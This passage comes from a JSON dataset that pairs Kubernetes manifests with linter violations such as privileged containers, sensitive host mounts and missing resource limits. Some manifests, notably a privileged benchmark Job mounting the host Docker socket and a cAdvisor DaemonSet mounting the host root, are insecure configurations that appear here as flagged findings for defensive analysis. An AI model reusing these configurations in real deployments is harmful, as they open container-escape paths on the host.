    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8501",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"openvino-benchmark-job\" is using an invalid container image, \"docker\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8502",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openvino-benchmark-job\" does not have a read-only root file system"
  },
  {
    "id": "8503",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"openvino-benchmark-job\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8504",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"openvino-benchmark-job\" is privileged"
  },
  {
    "id": "8505",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openvino-benchmark-job\" is not set to runAsNonRoot"
  },
  {
    "id": "8506",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openvino-benchmark-job\" has cpu request 0"
  },
  {
    "id": "8507",
    "manifest_path": "data/manifests/the_stack_sample/sample_3162.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: openvino-benchmark-job\n  labels:\n    jobgroup: openvino-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        jobgroup: openvino-benchmark\n    spec:\n      containers:\n      - name: openvino-benchmark-job\n        image: docker\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /usr/local/bin/docker run --rm --device-cgroup-rule='c 10:* rmw' --device-cgroup-rule='c\n          89:* rmw' --device-cgroup-rule='c 189:* rmw' --device-cgroup-rule='c 180:*\n          rmw' -v /dev:/dev -v /var/tmp:/var/tmp openvino-benchmark:1.0 /do_benchmark.sh\n        securityContext:\n          readOnlyRootFilesystem: false\n          privileged: true\n        volumeMounts:\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: usrsrc\n          mountPath: /usr/src\n          readOnly: true\n        - name: libmodules\n          mountPath: /lib/modules\n        - name: etcmodules\n          mountPath: /etc/modules-load.d\n        - name: vartmp\n          mountPath: /var/tmp\n      volumes:\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: usrsrc\n        hostPath:\n          path: /usr/src\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: etcmodules\n        hostPath:\n          path: /etc/modules-load.d\n      - name: vartmp\n        hostPath:\n          path: /var/tmp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openvino-benchmark-job\" has memory limit 0"
  },
  {
    "id": "8508",
    "manifest_path": "data/manifests/the_stack_sample/sample_3165.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: webstatus\n  labels:\n    app: eshop\n    service: webstatus\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    name: http\n  selector:\n    service: webstatus\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:webstatus])"
  },
  {
    "id": "8509",
    "manifest_path": "data/manifests/the_stack_sample/sample_3167.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: site-nginx\n  namespace: site\n  labels:\n    kubernetes.io/metadata.name: site\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: site-nginx\n  template:\n    metadata:\n      labels:\n        app: site-nginx\n        env: qa\n    spec:\n      volumes:\n      - name: www\n        persistentVolumeClaim:\n          claimName: pvc-www\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 150m\n          limits:\n            memory: 128Mi\n            cpu: 250m\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8510",
    "manifest_path": "data/manifests/the_stack_sample/sample_3167.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: site-nginx\n  namespace: site\n  labels:\n    kubernetes.io/metadata.name: site\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: site-nginx\n  template:\n    metadata:\n      labels:\n        app: site-nginx\n        env: qa\n    spec:\n      volumes:\n      - name: www\n        persistentVolumeClaim:\n          claimName: pvc-www\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 150m\n          limits:\n            memory: 128Mi\n            cpu: 250m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8511",
    "manifest_path": "data/manifests/the_stack_sample/sample_3167.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: site-nginx\n  namespace: site\n  labels:\n    kubernetes.io/metadata.name: site\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: site-nginx\n  template:\n    metadata:\n      labels:\n        app: site-nginx\n        env: qa\n    spec:\n      volumes:\n      - name: www\n        persistentVolumeClaim:\n          claimName: pvc-www\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 150m\n          limits:\n            memory: 128Mi\n            cpu: 250m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8512",
    "manifest_path": "data/manifests/the_stack_sample/sample_3171.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    death-star-project: hotel-res\n    app-name: mongodb-recommendation\n  namespace: hotel-res\n  name: mongodb-recommendation\nspec:\n  ports:\n  - name: '27021'\n    port: 27021\n    targetPort: 27017\n  selector:\n    death-star-project: hotel-res\n    app-name: mongodb-recommendation\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app-name:mongodb-recommendation death-star-project:hotel-res])"
  },
  {
    "id": "8513",
    "manifest_path": "data/manifests/the_stack_sample/sample_3172.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: payroll-service\nspec:\n  selector:\n    app: payroll-service-label\n  type: ClusterIP\n  ports:\n  - name: payroll-service-port\n    port: 8050\n    targetPort: 8050\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:payroll-service-label])"
  },
  {
    "id": "8514",
    "manifest_path": "data/manifests/the_stack_sample/sample_3173.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cadvisor\n  namespace: micado-worker\n  labels:\n    app.kubernetes.io/name: cadvisor\n    app.kubernetes.io/managed-by: micado\n    app.kubernetes.io/version: v0.33.0\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: cadvisor\n      app.kubernetes.io/managed-by: micado\n      app.kubernetes.io/version: v0.33.0\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: cadvisor\n        app.kubernetes.io/managed-by: micado\n        app.kubernetes.io/version: v0.33.0\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.33.0\n        args:\n        - --docker_only=true\n        - --housekeeping_interval=5s\n        - --disable_metrics=tcp,udp,disk\n        - --max_housekeeping_interval=15s\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 25m\n        volumeMounts:\n        - name: cadvisor-root\n          mountPath: /rootfs\n          readOnly: true\n        - name: cadvisor-run\n          mountPath: /var/run\n        - name: cadvisor-sys\n          mountPath: /sys\n          readOnly: true\n        - name: cadvisor-docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        - name: cadvisor-disk\n          mountPath: /dev/disk\n      volumes:\n      - name: cadvisor-root\n        hostPath:\n          path: /\n      - name: cadvisor-run\n        hostPath:\n          path: /var/run\n      - name: cadvisor-sys\n        hostPath:\n          path: /sys\n      - name: cadvisor-docker\n        hostPath:\n          path: /var/lib/docker\n      - name: cadvisor-disk\n        hostPath:\n          path: /dev/disk\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cadvisor\" does not have a read-only root file system"
  },
  {
    "id": "8515",
    "manifest_path": "data/manifests/the_stack_sample/sample_3173.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cadvisor\n  namespace: micado-worker\n  labels:\n    app.kubernetes.io/name: cadvisor\n    app.kubernetes.io/managed-by: micado\n    app.kubernetes.io/version: v0.33.0\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: cadvisor\n      app.kubernetes.io/managed-by: micado\n      app.kubernetes.io/version: v0.33.0\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: cadvisor\n        app.kubernetes.io/managed-by: micado\n        app.kubernetes.io/version: v0.33.0\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.33.0\n        args:\n        - --docker_only=true\n        - --housekeeping_interval=5s\n        - --disable_metrics=tcp,udp,disk\n        - --max_housekeeping_interval=15s\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 25m\n        volumeMounts:\n        - name: cadvisor-root\n          mountPath: /rootfs\n          readOnly: true\n        - name: cadvisor-run\n          mountPath: /var/run\n        - name: cadvisor-sys\n          mountPath: /sys\n          readOnly: true\n        - name: cadvisor-docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        - name: cadvisor-disk\n          mountPath: /dev/disk\n      volumes:\n      - name: cadvisor-root\n        hostPath:\n          path: /\n      - name: cadvisor-run\n        hostPath:\n          path: /var/run\n      - name: cadvisor-sys\n        hostPath:\n          path: /sys\n      - name: cadvisor-docker\n        hostPath:\n          path: /var/lib/docker\n      - name: cadvisor-disk\n        hostPath:\n          path: /dev/disk\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cadvisor\" is not set to runAsNonRoot"
  },
  {
    "id": "8516",
    "manifest_path": "data/manifests/the_stack_sample/sample_3173.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cadvisor\n  namespace: micado-worker\n  labels:\n    app.kubernetes.io/name: cadvisor\n    app.kubernetes.io/managed-by: micado\n    app.kubernetes.io/version: v0.33.0\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: cadvisor\n      app.kubernetes.io/managed-by: micado\n      app.kubernetes.io/version: v0.33.0\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: cadvisor\n        app.kubernetes.io/managed-by: micado\n        app.kubernetes.io/version: v0.33.0\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.33.0\n        args:\n        - --docker_only=true\n        - --housekeeping_interval=5s\n        - --disable_metrics=tcp,udp,disk\n        - --max_housekeeping_interval=15s\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 25m\n        volumeMounts:\n        - name: cadvisor-root\n          mountPath: /rootfs\n          readOnly: true\n        - name: cadvisor-run\n          mountPath: /var/run\n        - name: cadvisor-sys\n          mountPath: /sys\n          readOnly: true\n        - name: cadvisor-docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        - name: cadvisor-disk\n          mountPath: /dev/disk\n      volumes:\n      - name: cadvisor-root\n        hostPath:\n          path: /\n      - name: cadvisor-run\n        hostPath:\n          path: /var/run\n      - name: cadvisor-sys\n        hostPath:\n          path: /sys\n      - name: cadvisor-docker\n        hostPath:\n          path: /var/lib/docker\n      - name: cadvisor-disk\n        hostPath:\n          path: /dev/disk\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"cadvisor\""
  },
  {
    "id": "8517",
    "manifest_path": "data/manifests/the_stack_sample/sample_3173.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cadvisor\n  namespace: micado-worker\n  labels:\n    app.kubernetes.io/name: cadvisor\n    app.kubernetes.io/managed-by: micado\n    app.kubernetes.io/version: v0.33.0\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: cadvisor\n      app.kubernetes.io/managed-by: micado\n      app.kubernetes.io/version: v0.33.0\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: cadvisor\n        app.kubernetes.io/managed-by: micado\n        app.kubernetes.io/version: v0.33.0\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.33.0\n        args:\n        - --docker_only=true\n        - --housekeeping_interval=5s\n        - --disable_metrics=tcp,udp,disk\n        - --max_housekeeping_interval=15s\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 25m\n        volumeMounts:\n        - name: cadvisor-root\n          mountPath: /rootfs\n          readOnly: true\n        - name: cadvisor-run\n          mountPath: /var/run\n        - name: cadvisor-sys\n          mountPath: /sys\n          readOnly: true\n        - name: cadvisor-docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        - name: cadvisor-disk\n          mountPath: /dev/disk\n      volumes:\n      - name: cadvisor-root\n        hostPath:\n          path: /\n      - name: cadvisor-run\n        hostPath:\n          path: /var/run\n      - name: cadvisor-sys\n        hostPath:\n          path: /sys\n      - name: cadvisor-docker\n        hostPath:\n          path: /var/lib/docker\n      - name: cadvisor-disk\n        hostPath:\n          path: /dev/disk\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/sys\" is mounted on container \"cadvisor\""
  },
  {
    "id": "8518",
    "manifest_path": "data/manifests/the_stack_sample/sample_3173.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cadvisor\n  namespace: micado-worker\n  labels:\n    app.kubernetes.io/name: cadvisor\n    app.kubernetes.io/managed-by: micado\n    app.kubernetes.io/version: v0.33.0\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: cadvisor\n      app.kubernetes.io/managed-by: micado\n      app.kubernetes.io/version: v0.33.0\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: cadvisor\n        app.kubernetes.io/managed-by: micado\n        app.kubernetes.io/version: v0.33.0\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.33.0\n        args:\n        - --docker_only=true\n        - --housekeeping_interval=5s\n        - --disable_metrics=tcp,udp,disk\n        - --max_housekeeping_interval=15s\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 25m\n        volumeMounts:\n        - name: cadvisor-root\n          mountPath: /rootfs\n          readOnly: true\n        - name: cadvisor-run\n          mountPath: /var/run\n        - name: cadvisor-sys\n          mountPath: /sys\n          readOnly: true\n        - name: cadvisor-docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        - name: cadvisor-disk\n          mountPath: /dev/disk\n      volumes:\n      - name: cadvisor-root\n        hostPath:\n          path: /\n      - name: cadvisor-run\n        hostPath:\n          path: /var/run\n      - name: cadvisor-sys\n        hostPath:\n          path: /sys\n      - name: cadvisor-docker\n        hostPath:\n          path: /var/lib/docker\n      - name: cadvisor-disk\n        hostPath:\n          path: /dev/disk\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cadvisor\" has memory limit 0"
  },
  {
    "id": "8519",
    "manifest_path": "data/manifests/the_stack_sample/sample_3179.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deploy-nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: prod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8520",
    "manifest_path": "data/manifests/the_stack_sample/sample_3179.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deploy-nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: prod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8521",
    "manifest_path": "data/manifests/the_stack_sample/sample_3179.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deploy-nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: prod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8522",
    "manifest_path": "data/manifests/the_stack_sample/sample_3179.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deploy-nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: prod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8523",
    "manifest_path": "data/manifests/the_stack_sample/sample_3179.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deploy-nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n      env: prod\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: prod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8524",
    "manifest_path": "data/manifests/the_stack_sample/sample_3182.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gerritbot\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n    name: http\n  - port: 443\n    targetPort: 443\n    name: https\n  selector:\n    app: gerritbot\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gerritbot])"
  },
  {
    "id": "8525",
    "manifest_path": "data/manifests/the_stack_sample/sample_3184.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: 1-test-gang-job\nspec:\n  template:\n    metadata:\n      name: test-1\n      annotations:\n        firmament-gang-scheduling: '75'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.11.1-alpine\n        resources:\n          requests:\n            memory: 120Mi\n            cpu: 1200m\n          limits:\n            memory: 130Mi\n            cpu: 1300m\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8526",
    "manifest_path": "data/manifests/the_stack_sample/sample_3184.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: 1-test-gang-job\nspec:\n  template:\n    metadata:\n      name: test-1\n      annotations:\n        firmament-gang-scheduling: '75'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.11.1-alpine\n        resources:\n          requests:\n            memory: 120Mi\n            cpu: 1200m\n          limits:\n            memory: 130Mi\n            cpu: 1300m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8527",
    "manifest_path": "data/manifests/the_stack_sample/sample_3184.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: 1-test-gang-job\nspec:\n  template:\n    metadata:\n      name: test-1\n      annotations:\n        firmament-gang-scheduling: '75'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.11.1-alpine\n        resources:\n          requests:\n            memory: 120Mi\n            cpu: 1200m\n          limits:\n            memory: 130Mi\n            cpu: 1300m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8528",
    "manifest_path": "data/manifests/the_stack_sample/sample_3185.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nifi-ca\n  labels:\n    app: ca-ca\nspec:\n  type: ClusterIP\n  ports:\n  - port: 9090\n    targetPort: 9090\n    name: ca-server\n  selector:\n    app: ca-ca\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ca-ca])"
  },
  {
    "id": "8529",
    "manifest_path": "data/manifests/the_stack_sample/sample_3187.yaml",
